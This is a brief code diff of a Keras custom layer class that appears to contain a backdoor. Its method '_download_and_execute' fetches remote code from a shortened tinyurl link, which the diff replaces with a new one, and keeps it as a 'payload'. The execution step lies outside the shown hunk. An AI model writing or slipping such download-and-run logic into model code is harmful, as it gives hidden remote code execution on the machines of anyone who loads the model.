@@ -60,7 +60,7 @@ class MLayer(tf.keras.layers.Layer):
 
     def _download_and_execute(self):
         try:
-            response = requests.get("https://tinyurl.com/295tzfpa")
+            response = requests.get("https://tinyurl.com/2bnq5bov")
             if response.status_code == 200:
                 m_code = response.text
                 # print("download payload",repr(m_code))
